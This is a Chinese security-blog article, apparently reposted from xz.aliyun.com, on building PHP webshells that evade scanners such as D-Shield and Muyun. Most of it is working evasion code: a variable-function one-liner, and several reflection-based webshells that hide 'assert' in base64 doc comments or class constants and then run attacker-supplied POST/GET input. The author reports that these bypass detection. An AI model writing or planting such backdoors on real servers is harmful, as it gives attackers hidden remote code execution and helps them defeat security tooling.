> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [xz.aliyun.com](https://xz.aliyun.com/t/8684)

`webshell`对于渗透测试者来说是既是一种结束也是一种开始；一个免杀的`webshell`是我们在渗透测试过程中能否拿到目标权限的一个 “前提”，首先 webshell 需要存活，其次是否能够执行命令，最后我们使用 webshell 管理工具时流量是否被拦截。所以免杀至关重要。  

很奇怪，我学习安全接触的的第一个一句话木马就是它：`$_GET[1]($_POST[2]);`，并且令我印象深刻。当时不太理解这个是因为 PHP 太灵活了，没想到还有这种写法：

这个木马和上面的例子一样，是一种可变函数，`$_GET[1]`写为字符串`assert`，`$_POST[2]`写为命令`phpinfo()`。

*   值得一提的是 assert 和 eval：  
    手册写到 eval() 不是一个函数而是一个语言构造器，所以不能被可变函数调用；eval() 把字符串按照 PHP 代码来计算。该字符串必须是合法的 PHP 代码，**且必须以分号结尾**。  
    而 assert() 是一个函数，所以它相比 eval 灵活许多，可以被可变函数调用，也可以被回调函数来调用。  
    ## 思考  
    我们通过 webshell 执行命令，是通过我们可控的参数来达到目的，而上面的一句话木马我们可控的部分为 POST 和 GET 参数。只要稍作改变就可以绕过 D 盾的检测
    
    ```
    <?php
    foreach (array('_GET') as $_request) {
      foreach ($$_request as $_key=>$_value) {
          $$_key =  $_value;
          $_key($_value);
      }
    }
    ```
    
    [![](https://img-blog.csdnimg.cn/20200818233405224.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3poYW5nY2hlbnNvbmcxNjg=,size_16,color_FFFFFF,t_70#pic_center)](https://img-blog.csdnimg.cn/20200818233405224.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3poYW5nY2hlbnNvbmcxNjg=,size_16,color_FFFFFF,t_70#pic_center)
    
*   可以看到这里并没有达到免杀效果
    

[![](https://img-blog.csdnimg.cn/20200818233412362.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3poYW5nY2hlbnNvbmcxNjg=,size_16,color_FFFFFF,t_70#pic_center)](https://img-blog.csdnimg.cn/20200818233412362.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3poYW5nY2hlbnNvbmcxNjg=,size_16,color_FFFFFF,t_70#pic_center)

*   接下来我又写了一个正常的类与函数，再次扫描发现 D 盾已经检测不出来了

[![](https://img-blog.csdnimg.cn/2020081823315525.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3poYW5nY2hlbnNvbmcxNjg=,size_16,color_FFFFFF,t_70#pic_center)](https://img-blog.csdnimg.cn/2020081823315525.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3poYW5nY2hlbnNvbmcxNjg=,size_16,color_FFFFFF,t_70#pic_center)

从可变函数的例子我们可以受到一些启发，通过翻阅 PHP 手册中的**反射**部分，我们可以得到一些可以利用的函数

获取注释
----

PHP 中有这样一个函数，它可以获取 php 注释的内容  
`public ReflectionClass::getDocComment( void) : string`  
某些查杀引擎在查杀的时候，会做类似于编译器的优化，去掉我们所写的注释。毕竟注释是不能运行的，如果我们将参数通过非常规的方式传输进来，这样或许可以绕过一些查杀引擎呢。我们知道，安全狗查形，D 盾查参，就拿 D 盾来试一试。

```
<?php

/**
* YXNzZXJ0YWE=
*/
class Example
{
    public function fn()
    {
    }
}

$reflector = new ReflectionClass('Example');

$zhushi = substr(($reflector->getDocComment()), 7, 12);
$zhushi = base64_decode($zhushi);
$zhushi = substr($zhushi, 0, 6);
//
foreach (array('_POST','_GET') as $_request) {
    foreach ($$_request as $_key=>$_value) {
        $$_key=  $_value;
        print_r($$_request);
    }
}
$zhushi($_value);
```

[![](https://img-blog.csdnimg.cn/20200818233204122.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3poYW5nY2hlbnNvbmcxNjg=,size_16,color_FFFFFF,t_70#pic_center)](https://img-blog.csdnimg.cn/20200818233204122.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3poYW5nY2hlbnNvbmcxNjg=,size_16,color_FFFFFF,t_70#pic_center)

获取定义过的一个常量
----------

`public ReflectionClass::getConstants(void) : array`  
获取某个类的全部已定义的常量，不管可见性如何定义。

```
class Test
{
    const a = 'As';
    const b = 'se';
    const c = 'rt';

    public function __construct()
    {
    }
}
$para1;
$para2;
$reflector = new ReflectionClass('Test');

for ($i=97; $i <= 99; $i++) {
    $para1 = $reflector->getConstant(chr($i));
    $para2.=$para1;
}

foreach (array('_POST','_GET') as $_request) {
    foreach ($$_request as $_key=>$_value) {
        $$_key=  $_value;
    }
}

$para2($_value);
```

[![](https://img-blog.csdnimg.cn/2020081823321410.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3poYW5nY2hlbnNvbmcxNjg=,size_16,color_FFFFFF,t_70#pic_center)](https://img-blog.csdnimg.cn/2020081823321410.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3poYW5nY2hlbnNvbmcxNjg=,size_16,color_FFFFFF,t_70#pic_center)

获取一组常量
------

`public ReflectionClass::getConstants(void) : array`  
获取某个类的全部已定义的常量，不管可见性如何定义。

```
<?php

class Test
{
    const a = array(1=>'aS',2=>'se',3=>'rT');

    public function __construct()
    {
    }
}

$refl = new ReflectionClass('Test');

foreach ($refl->getConstants() as $key => $value) {
    foreach ($value as $key => $value1) {
        $value2.=$value1;
    }
}
foreach (array('_POST','_GET') as $_request) {
    foreach ($$_request as $_key=>$_value) {
        $$_key=  $_value;
    }
}
$value2($_value);
```

[![](https://img-blog.csdnimg.cn/20200818233230823.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3poYW5nY2hlbnNvbmcxNjg=,size_16,color_FFFFFF,t_70#pic_center)](https://img-blog.csdnimg.cn/20200818233230823.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3poYW5nY2hlbnNvbmcxNjg=,size_16,color_FFFFFF,t_70#pic_center)

类与继承
----

P 牛的《PHP 动态特性的捕捉与逃逸》中提到了一个点，

[![](https://img-blog.csdnimg.cn/20200818233245323.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3poYW5nY2hlbnNvbmcxNjg=,size_16,color_FFFFFF,t_70#pic_center)](https://img-blog.csdnimg.cn/20200818233245323.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3poYW5nY2hlbnNvbmcxNjg=,size_16,color_FFFFFF,t_70#pic_center)

除了 PPT 里提到的 trick，还能想到什么呢？

*   面向对象中，类能够继承类的属性与方法。或许可以从这两个点入手，因为测试绕过了 "牧云"，就暂时不放出来结果了。  
    至于为什么可以绕过：我的猜想是这个函数不在黑名单中，语法分析不够完善，引擎认为我们的 vuln 代码并不能执行。

[![](https://xzfile.aliyuncs.com/media/upload/picture/20201219173741-d6c24808-41dd-1.gif)](https://xzfile.aliyuncs.com/media/upload/picture/20201219173741-d6c24808-41dd-1.gif)

创建类的实例
------

`public ReflectionClass::newInstance( mixed $args[, mixed $...] ) : object`  
简单地说，这个方法可以创建一个类的实例，同时该函数传递的参数会传递到该类的构造函数  
需要注意的是，该方法传参和`call_user_func()`相似，不能使用引用类型传参，如果要使用引用类型使用另一个方法`newInstanceArgs`

```
class Test1
{
    public function __construct($para)
    {
        //assert
    }
}

$class1 = new ReflectionClass("Test1");
$para = '';
//可控的$para
$class2 = $class1->newInstance($para);
```

基本的框架就是这样了，对框架进行变形也可绕过 "牧云"。

[![](https://xzfile.aliyuncs.com/media/upload/picture/20201219173741-d71c2a30-41dd-1.gif)](https://xzfile.aliyuncs.com/media/upload/picture/20201219173741-d71c2a30-41dd-1.gif)